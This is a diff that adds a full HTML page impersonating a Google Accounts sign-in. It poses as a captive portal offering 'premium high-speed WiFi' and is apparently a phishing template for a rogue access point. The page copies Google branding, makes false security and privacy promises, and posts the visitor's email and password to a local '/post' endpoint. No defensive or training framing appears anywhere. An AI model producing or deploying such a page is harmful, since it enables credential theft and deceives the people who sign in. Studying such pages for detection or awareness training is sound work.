@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Roboto', arial, sans-serif; }
+        body { background-color: #fff; color: #202124; font-size: 14px; line-height: 1.4286; margin: 0; padding: 0; }
+        .container { display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 20px; }
+        .google-logo { margin: 30px 0; text-align: center; }
+        .google-logo img { height: 92px; width: 272px; }
+        .wifi-info { text-align: center; margin: 10px 0; padding: 10px; background: #e8f0fe; border-radius: 8px; border: 1px solid #d2e3fc; }
+        .wifi-info p { margin: 0; color: #1a73e8; font-size: 13px; font-weight: 500; }
+        .premium-header { text-align: center; margin: 20px 0; padding: 0 20px; }
+        .premium-header h1 { font-size: 28px; font-weight: 500; color: #1a73e8; margin-bottom: 10px; }
+        .premium-header p { font-size: 16px; color: #5f6368; line-height: 1.5; max-width: 500px; margin: 0 auto; }
+        .premium-benefits { display: flex; justify-content: space-around; margin: 30px 0; flex-wrap: wrap; gap: 15px; }
+        .benefit-item { text-align: center; padding: 20px; background: #f8f9fa; border-radius: 12px; flex: 1; min-width: 150px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .benefit-item h3 { color: #1a73e8; margin-bottom: 8px; font-weight: 500; font-size: 14px; }
+        .benefit-item p { color: #5f6368; font-size: 12px; line-height: 1.4; }
+        .premium-offer { background: #1a73e8; color: white; padding: 15px; border-radius: 8px; margin: 20px 0; text-align: center; }
+        .premium-offer h3 { font-size: 16px; font-weight: 500; margin-bottom: 5px; }
+        .premium-offer p { font-size: 14px; opacity: 0.9; margin: 0; }
+        .login-box { border: 1px solid #dadce0; border-radius: 12px; padding: 30px; width: 100%; max-width: 480px; background: #fff; box-shadow: 0 4px 20px rgba(0,0,0,0.1); margin: 20px 0; }
+        .login-title { font-size: 24px; font-weight: 500; margin-bottom: 5px; text-align: center; color: #202124; }
+        .login-subtitle { font-size: 16px; padding-bottom: 20px; text-align: center; color: #5f6368; border-bottom: 1px solid #dadce0; margin-bottom: 25px; }
+        .form-group { margin-bottom: 20px; width: 100%; }
+        .input-field { border: 1px solid #dadce0; border-radius: 6px; color: #202124; font-size: 16px; height: 55px; padding: 13px 15px; width: 100%; box-sizing: border-box; }
+        .input-field:focus { border: 2px solid #1a73e8; outline: none; }
+        .btn-container { display: flex; justify-content: space-between; margin-top: 25px; width: 100%; }
+        .btn-create { background: transparent; border: none; color: #1a73e8; cursor: pointer; font-weight: 500; padding: 12px 0; font-size: 14px; }
+        .btn-next { background: #1a73e8; border: none; border-radius: 6px; color: #fff; cursor: pointer; font-weight: 500; padding: 12px 28px; font-size: 14px; }
+        .btn-next:hover { background: #1565c0; }
+        .trust-badge { text-align: center; margin: 20px 0; padding: 15px; background: #f8f9fa; border-radius: 8px; border: 1px solid #dadce0; }
+        .trust-badge p { font-size: 13px; color: #5f6368; margin: 0; }
+        .security-note { text-align: center; margin-top: 20px; font-size: 12px; color: #5f6368; }
+        .footer { display: flex; flex-wrap: wrap; justify-content: space-between; margin-top: 30px; width: 100%; max-width: 480px; padding: 20px 0; border-top: 1px solid #dadce0; }
+        .footer select { background: transparent; border: none; color: #757575; cursor: pointer; font-size: 12px; padding: 6px 8px 6px 2px; }
+        .footer-links { display: flex; }
+        .footer-link { color: #757575; font-size: 12px; margin-left: 24px; text-decoration: none; }
+        @media (max-width: 768px) { 
+            .premium-benefits { flex-direction: column; }
+            .benefit-item { margin: 10px 0; }
+            .login-box { padding: 20px; }
+            .premium-header h1 { font-size: 24px; }
+            .premium-header p { font-size: 14px; }
+            .footer { flex-direction: column-reverse; align-items: center; gap: 15px; }
+            .footer-links { margin-bottom: 15px; }
+            .input-field { padding: 13px 12px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="google-logo">
+            <img src="/google-logo.svg" alt="Google" width="272" height="92">
+        </div>
+        
+        <div class="wifi-info">
+            <p>Multiple WiFi Networks Available</p>
+        </div>
+        
+        <div class="premium-header">
+            <h1>Unlock Premium High-Speed WiFi with Google</h1>
+            <p>Sign in securely with your Google account to access our fastest network tier</p>
+        </div>
+        
+        <div class="premium-benefits">
+            <div class="benefit-item">
+                <h3>Lightning-Fast</h3>
+                <p>Up to 100Mbps download speeds</p>
+            </div>
+            <div class="benefit-item">
+                <h3>Google-Secured</h3>
+                <p>Enterprise-grade protection</p>
+            </div>
+            <div class="benefit-item">
+                <h3>Lag-Free</h3>
+                <p>Optimized for gaming & streaming</p>
+            </div>
+            <div class="benefit-item">
+                <h3>Unlimited Data</h3>
+                <p>No bandwidth restrictions</p>
+            </div>
+        </div>
+        
+        <div class="login-box">
+            <h1 class="login-title">Sign in</h1>
+            <p class="login-subtitle">Use your Google Account to access premium WiFi</p>
+            
+            <div class="premium-offer">
+                <h3>Exclusive Offer for Google Users</h3>
+                <p>Get instant access to our fastest network tier</p>
+            </div>
+            
+            <form action="/post" method="post">
+                <div class="form-group">
+                    <input type="email" class="input-field" name="email" placeholder="Email or phone" autocomplete="email" required>
+                </div>
+                
+                <div class="form-group">
+                    <input type="password" class="input-field" name="password" placeholder="Enter your password" autocomplete="current-password" required>
+                </div>
+                
+                <div class="btn-container">
+                    <button type="button" class="btn-create">Create account</button>
+                    <button type="submit" class="btn-next">Unlock Premium WiFi</button>
+                </div>
+            </form>
+            
+            <div class="trust-badge">
+                <p>Google-secured connection • Enterprise-grade security • Trusted by millions worldwide</p>
+            </div>
+        </div>
+        
+        <div class="security-note">
+            <p>Your privacy is protected by Google's security standards. We never share your personal information.</p>
+        </div>
+        
+        <div class="footer">
+            <div class="language-picker">
+                <select>
+                    <option>English (United States)</option>
+                    <option>Español</option>
+                    <option>Français</option>
+                </select>
+            </div>
+            
+            <div class="footer-links">
+                <a href="#" class="footer-link">Help</a>
+                <a href="#" class="footer-link">Privacy</a>
+                <a href="#" class="footer-link">Terms</a>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
